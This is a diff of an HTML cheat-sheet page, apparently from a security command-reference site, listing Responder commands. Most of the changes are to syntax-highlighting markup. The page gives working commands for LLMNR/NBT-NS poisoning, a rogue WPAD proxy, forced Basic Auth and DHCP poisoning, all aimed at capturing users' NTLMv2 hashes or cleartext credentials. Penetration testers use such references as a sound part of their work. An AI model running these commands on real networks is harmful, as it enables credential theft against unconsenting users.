@@ -115,7 +115,7 @@
             
             <div class="flex flex-wrap gap-2">
                 <!-- Tags populated by python -->
-                <!-- responder, cybersecurity, command reference -->
+                <!-- responder, cybersecurity, command reference, ad -->
             </div>
         </header>
 
@@ -126,58 +126,58 @@
 <p><strong>Responder</strong> is a LLMNR, NBT-NS and MDNS poisoner. It answers specific NBT-NS (NetBIOS Name Service) queries based on their name suffix.</p>
 <h2>Top 10 Useful Commands</h2>
 <h3>1. Basic Analysis (Listen Only)</h3>
-<pre class="codehilite"><code class="language-bash">responder -I eth0 -A
-</code></pre>
+<div class="codehilite"><pre><span></span><code>responder<span class="w"> </span>-I<span class="w"> </span>eth0<span class="w"> </span>-A
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Analyze mode (<code>-A</code>). See what requests are flying around the network without poisoning.</p>
 <h3>2. Start Poisoning</h3>
-<pre class="codehilite"><code class="language-bash">responder -I eth0
-</code></pre>
+<div class="codehilite"><pre><span></span><code>responder<span class="w"> </span>-I<span class="w"> </span>eth0
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Start responding to LLMNR/NBT-NS queries. Clients will send you their NTLMv2 hashes.</p>
 <h3>3. Force WPAD auth</h3>
-<pre class="codehilite"><code class="language-bash">responder -I eth0 -w
-</code></pre>
+<div class="codehilite"><pre><span></span><code>responder<span class="w"> </span>-I<span class="w"> </span>eth0<span class="w"> </span>-w
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Start the WPAD rogue proxy server.</p>
 <h3>4. Force Basic Auth</h3>
-<pre class="codehilite"><code class="language-bash">responder -I eth0 -b
-</code></pre>
+<div class="codehilite"><pre><span></span><code>responder<span class="w"> </span>-I<span class="w"> </span>eth0<span class="w"> </span>-b
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Force clients to send cleartext credentials (Basic Auth) instead of encrypted hashes.</p>
 <h3>5. Fingerprint</h3>
-<pre class="codehilite"><code class="language-bash">responder -I eth0 -F
-</code></pre>
+<div class="codehilite"><pre><span></span><code>responder<span class="w"> </span>-I<span class="w"> </span>eth0<span class="w"> </span>-F
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Attempt to fingerprint host OS versions passively.</p>
 <h3>6. Verbose</h3>
-<pre class="codehilite"><code class="language-bash">responder -I eth0 -v
-</code></pre>
+<div class="codehilite"><pre><span></span><code>responder<span class="w"> </span>-I<span class="w"> </span>eth0<span class="w"> </span>-v
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Show more details about captured packets.</p>
 <h3>7. Disable SMB</h3>
-<pre class="codehilite"><code class="language-bash"># Edit Responder.conf -&gt; Turn &quot;SMB = Off&quot;
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="c1"># Edit Responder.conf -&gt; Turn &quot;SMB = Off&quot;</span>
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Essential when doing NTLM Relay attacks (you can't bind port 445 if you want to relay it).</p>
 <h3>8. DHCP Poisoning</h3>
-<pre class="codehilite"><code class="language-bash">responder -I eth0 -d
-</code></pre>
+<div class="codehilite"><pre><span></span><code>responder<span class="w"> </span>-I<span class="w"> </span>eth0<span class="w"> </span>-d
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Inject WPAD via DHCP responses (dangerous/noisy).</p>
 <h3>9. External IP</h3>
-<pre class="codehilite"><code class="language-bash">responder -I eth0 -e 10.10.10.5
-</code></pre>
+<div class="codehilite"><pre><span></span><code>responder<span class="w"> </span>-I<span class="w"> </span>eth0<span class="w"> </span>-e<span class="w"> </span><span class="m">10</span>.10.10.5
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Tell victims to connect to a specific IP.</p>
 <h3>10. Kill Session</h3>
-<pre class="codehilite"><code class="language-bash"># (Ctrl+C)
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="c1"># (Ctrl+C)</span>
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Responder should be stopped gracefully to revert network changes.</p>
 <h2>The Most Powerful Command</h2>
-<pre class="codehilite"><code class="language-bash">responder -I eth0 -dwv
-</code></pre>
+<div class="codehilite"><pre><span></span><code>responder<span class="w"> </span>-I<span class="w"> </span>eth0<span class="w"> </span>-dwv
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Poison everything (LLMNR, NBT-NS, DNS, WPAD). If a user types a wrong server name (e.g., <code>\fileserverr</code>), you get their hash.</p>
         </div>
